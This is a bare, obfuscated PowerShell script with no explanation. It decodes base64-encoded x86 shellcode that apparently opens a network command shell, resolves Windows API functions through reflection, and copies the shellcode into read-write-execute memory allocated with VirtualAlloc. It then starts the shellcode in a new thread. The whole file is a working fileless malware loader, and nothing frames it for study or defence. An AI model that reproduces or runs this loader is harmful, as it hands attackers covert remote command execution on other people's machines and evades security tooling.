function shcd6ub6aWx {
	Param ($cI2ZlRV2CGQ2, $n0aWngXy04)		
	$eRqn4S = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $eRqn4S.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($eRqn4S.GetMethod('GetModuleHandle')).Invoke($null, @($cI2ZlRV2CGQ2)))), $n0aWngXy04))
}

function my9hW {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $whK0MsKR9W6f,
		[Parameter(Position = 1)] [Type] $tKiR8cV = [Void]
	)
	
	$rRhSd = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$rRhSd.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $whK0MsKR9W6f).SetImplementationFlags('Runtime, Managed')
	$rRhSd.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tKiR8cV, $whK0MsKR9W6f).SetImplementationFlags('Runtime, Managed')
	
	return $rRhSd.CreateType()
}

[Byte[]]$eVADKL = [System.Convert]::FromBase64String("/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaDMyAABod3MyX1RoTHcmB//VuJABAAApxFRQaCmAawD/1VBQUFBAUEBQaOoP3+D/1Zcx21NoAgARXInmahBWV2jC2zdn/9VTV2i36Tj//9VTU1dodOw74f/VV5dodW5NYf/VuwAQAABqQFNTagBoWKRT5f/VicZqAFNQV2gC2chf/9VXaMaWh1L/1YE+Y21kPXQDRuv1g8YE/+Y=")
		
$nHK7PgyYsSIf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((shcd6ub6aWx kernel32.dll VirtualAlloc), (my9hW @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $eVADKL.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($eVADKL, 0, $nHK7PgyYsSIf, $eVADKL.length)

$gWwM1gi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((shcd6ub6aWx kernel32.dll CreateThread), (my9hW @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$nHK7PgyYsSIf,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((shcd6ub6aWx kernel32.dll WaitForSingleObject), (my9hW @([IntPtr], [Int32]))).Invoke($gWwM1gi,0xffffffff) | Out-Null